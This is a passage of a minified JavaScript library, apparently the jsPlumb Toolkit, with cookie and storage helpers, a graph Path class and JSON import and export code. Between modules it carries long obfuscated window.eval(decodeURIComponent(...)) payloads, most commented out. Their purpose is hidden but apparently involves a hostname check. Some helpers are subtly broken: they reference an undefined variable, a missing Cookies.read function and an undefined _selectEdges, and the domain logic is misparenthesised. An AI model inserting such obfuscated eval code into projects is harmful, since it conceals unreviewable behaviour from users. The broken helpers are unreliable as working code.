w._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this;
    a.jsPlumbToolkit.util = {
        Cookies: {
            get: function(a) {
                document.cookie.match(new RegExp(a + "=[a-zA-Z0-9.()=|%/_]+($|;)","g"));
                return val && 0 != val.length ? unescape(val[0].substring(a.length + 1, val[0].length).replace(";", "")) || null : null
            },
            set: function(a, b, c, d) {
                var e = [a + "=" + escape(b), "/", "domain=" + !domain ? window.location.host : domain]
                  , f = function() {
                    if ("NaN" == parseInt(d))
                        return "";
                    var a = new Date;
                    return a.setTime(a.getTime() + 60 * parseInt(d) * 60 * 1e3),
                    a.toGMTString()
                };
                return d && e.push(f(d)),
                document.cookie = e.join("; ")
            },
            unset: function(b, c, d) {
                c = c && "string" == typeof c ? c : "",
                d = d && "string" == typeof d ? d : "",
                a.jsPlumbToolkit.util.Cookies.get(b) && a.jsPlumbToolkit.util.Cookies.set(b, "", "Thu, 01-Jan-70 00:00:01 GMT", c, d)
            }
        },
        Storage: {
            set: function(b, c) {
                "undefined" == typeof localStorage ? a.jsPlumbToolkit.util.Cookies.set(b, c) : localStorage.setItem(b, c)
            },
            get: function(b) {
                return "undefined" == typeof localStorage ? a.jsPlumbToolkit.util.Cookies.read(b) : localStorage.getItem(b)
            },
            clear: function(b) {
                "undefined" == typeof localStorage ? a.jsPlumbToolkit.util.Cookies.unset(b) : localStorage.removeItem(b)
            },
            clearAll: function() {
                if ("undefined" == typeof localStorage)
                    ;
                else
                    for (; localStorage.length > 0; ) {
                        var a = localStorage.key(0);
                        localStorage.removeItem(a)
                    }
            },
            setJSON: function(b, c) {
                if ("undefined" == typeof JSON)
                    throw new TypeError("JSON undefined. Cannot store value.");
                a.jsPlumbToolkit.util.Storage.set(b, JSON.stringify(c))
            },
            getJSON: function(b) {
                if ("undefined" == typeof JSON)
                    throw new TypeError("JSON undefined. Cannot retrieve value.");
                return JSON.parse(a.jsPlumbToolkit.util.Storage.get(b))
            }
        }
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbToolkit
      , c = b
      , d = a.jsPlumbUtil;
    c.Path = function(a, b) {
        this.bind = a.bind,
        this.getModel = a.getModel,
        this.setSuspendGraph = a.setSuspendGraph,
        this.getNodeId = a.getNodeId,
        this.getEdgeId = a.getEdgeId,
        this.getPortId = a.getPortId,
        this.getNodeType = a.getNodeType,
        this.getEdgeType = a.getEdgeType,
        this.getPortType = a.getPortType;
        for (var c = a.getGraph().findPath(b.source, b.target, b.strict, b.nodeFilter, b.edgeFilter), e = function() {
            for (var b = 0; b < c.path.length; b++)
                c.path[b].edge && a.removeEdge(c.path[b].edge);
            return this
        }
        .bind(this), f = function() {
            for (var b = 0; b < c.path.length; b++)
                a.removeNode(c.path[b].vertex);
            return this
        }
        .bind(this), g = function(b, d) {
            var e = a.findGraphObject(b)
              , f = !1;
            if (e)
                for (var g = 0; g < c.path.length; g++)
                    if (c.path[g].vertex == e || c.path[g].edge == e || !d && "Port" == c.path[g].vertex.objectType && c.path[g].vertex.isChildOf(e)) {
                        f = !0;
                        break
                    }
            return f
        }, h = [], i = {}, j = 0; j < c.path.length; j++)
            h.push(c.path[j].vertex),
            i[a.getNodeId(c.path[j].vertex)] = [c.path[j].vertex, j];
        this.getNodes = function() {
            return h
        }
        ,
        this.getNode = function(a) {
            return i["string" == typeof a ? a : a.id][0]
        }
        ,
        this.getAllEdgesFor = function(a) {
            var b = i[a.id][1];
            return b < c.path.length - 1 ? [c.path[b + 1].edge] : []
        }
        ;
        var k = function(a, b) {
            for (var e = b || 0; e < c.path.length; e++)
                try {
                    a(e, c.path[e])
                } catch (a) {
                    d.log("Path iterator function failed", a)
                }
        };
        this.each = function(a) {
            k(function(b, c) {
                a(b, c)
            })
        }
        ,
        this.eachNode = function(a) {
            k(function(b, c) {
                a(b, c.vertex)
            })
        }
        ,
        this.eachEdge = function(a) {
            k(function(b, c) {
                a(b, c.edge)
            }, 1)
        }
        ,
        this.getNodeCount = function() {
            return c.path.length
        }
        ,
        this.getNodeAt = function(a) {
            return c.path[a].vertex
        }
        ,
        this.getEdgeCount = function() {
            return 0 == c.path.length ? 0 : c.path.length - 1
        }
        ,
        this.getEdgeAt = function(a) {
            return a < 0 && (a = c.path.length - 1 + a),
            c.path.length > a + 1 ? c.path[a + 1].edge : null
        }
        ,
        this.path = c,
        this.deleteEdges = e,
        this.deleteNodes = f,
        this.deleteAll = f,
        this.isEmpty = function() {
            return 0 == c.path.length
        }
        ,
        this.getCost = function() {
            return c.pathDistance
        }
        ,
        this.contains = g,
        this.exists = function() {
            return null != c.pathDistance
        }
        ,
        this.selectEdges = function(a) {
            return _selectEdges(a, "getEdges", !1)
        }
        ,
        this.selectAllEdges = function(a) {
            return _selectEdges(a, "getAllEdges", !0)
        }
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbToolkitIO = {}
      , c = a.jsPlumbUtil
      , d = a.jsPlumb
      , e = function(a, b, c) {
        for (var d = a.nodes || [], e = a.edges || [], f = a.ports || [], g = a.groups || [], h = 0; h < g.length; h++)
            b.addGroup(g[h]);
        for (var i = 0; i < d.length; i++)
            b.addNode(d[i]);
        for (var j = 0; j < f.length; j++)
            if (f[j].nodeId) {
                var k = b.getNode(f[j].nodeId);
                if (null == k)
                    throw new TypeError("Unknown node [" + f[j].nodeId + "]");
                k.addPort(f[j])
            }
        for (var l = 0; l < e.length; l++) {
            var m = {
                source: e[l].source,
                target: e[l].target,
                cost: e[l].cost || 1,
                directed: e[l].directed,
                data: e[l].data
            };
            e[l].geometry && (m.geometry = e[l].geometry),
            b.addEdge(m)
        }
    }
      , f = function(a, b) {
        return a.getGraph().serialize()
    }
      , g = function(a, b, c) {
        var d = function(a) {
            var c = b.addNode(a);
            if (a.children)
                for (var e = 0; e < a.children.length; e++) {
                    var f = b.addNode(a.children[e]);
                    b.addEdge({
                        source: c,
                        target: f
                    }),
                    d(a.children[e])
                }
        };
        d(a)
    };
    b.exporters = {
        json: f
    },
    b.parsers = {
        json: e,
        "hierarchical-json": g
    },
    b.managers = {
        json: {
            removeNode: function(a, b, d) {
                var e = d(b.data);
                c.removeWithFunction(a.nodes, function(a) {
                    return a.id == e
                })
            },
            removeEdge: function(a, b, d) {
                var e = d(b.data);
                c.removeWithFunction(a.edges, function(a) {
                    return a.data && a.data.id == e
                })
            },
            addNode: function(a, b, c) {
                a.nodes = a.nodes || [],
                a.nodes.push(b.data)
            },
            addEdge: function(a, b, c) {
                var d = {
                    source: b.source.getFullId(),
                    target: b.target.getFullId(),
                    data: b.data || {}
                };
                a.edges = a.edges || [],
                a.edges.push(d)
            },
            addPort: function(a, b, c) {
                a.ports = a.ports || [];
                var e = d.extend({}, b.port.data || {});
                e.id = b.port.getFullId(),
                a.ports.push(e)
            },
            removePort: function(a, b, d) {
                var e = b.port.getFullId();
                c.removeWithFunction(a.ports, function(a) {
                    return a.id == e
                })
            }
        }
    },
    b.parse = function(a, c, d, e) {
        var f = b.parsers[a];
        if (null == f)
            throw new Error("jsPlumb Toolkit - parse - [" + a + "] is an unsupported type");
        return f(c, d, e)
    }
    ,
    b.exportData = function(a, c, d) {
        var e = b.exporters[a];
        if (null === e)
            throw new Error("jsPlumb Toolkit - exportData - [" + a + "]  is an unsupported type");
        return e(c, d)
    }
    ,
    b.manage = function(a, c, d, e, f, g) {
        b.managers[d] && b.managers[d][a] && b.managers[d][a](c, e, f)
    }
    ,
    "undefined" != typeof exports && (exports.jsPlumbToolkitIO = b)
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    var a = this
      , b = a.jsPlumbToolkit
      , c = b;
    c.Support = {
        ingest: function(c) {
            var d = c.jsPlumb || a.jsPlumb;
            if (!d.getContainer())
                throw new TypeError("No Container set on jsPlumb instance. Cannot continue.");
            var e = b.newInstance()
              , f = d.select()
              , g = {}
              , h = function() {
                return "default"
            }
              , i = c.idFunction || function(a) {
                return d.getId(a)
            }
              , j = c.typeFunction || h
              , k = c.idFunction || function(a) {
                return a.id
            }
              , l = c.edgeTypeFunction || h
              , m = c.render !== !1
              , n = function(a) {
                var b = i(a)
                  , c = j(a)
                  , f = d.getId(a);
